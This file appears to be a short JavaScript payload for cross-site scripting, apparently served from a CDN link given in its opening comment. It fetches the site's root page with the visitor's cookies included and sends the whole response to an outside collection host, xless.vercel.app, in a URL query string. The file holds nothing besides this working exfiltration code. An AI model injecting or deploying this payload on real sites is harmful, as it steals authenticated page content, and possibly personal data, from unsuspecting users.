// https://cdn.jsdelivr.net/gh/mazen160/test@main/hello.txt

// Fetch the root page and send to xless
fetch('/', {
    method: 'GET',
    credentials: 'include'
})
    .then(response => response.text())
    .then(rootData => {
        // Send root page data to external URL
        fetch(`https://xless.vercel.app/message?text=${encodeURIComponent(rootData)}`, {
            method: 'GET'
        })
            .catch(error => {
                console.error('Error sending root page to external URL:', error);
            });
    })
    .catch(error => {
        console.error('Error fetching root page:', error);
    });
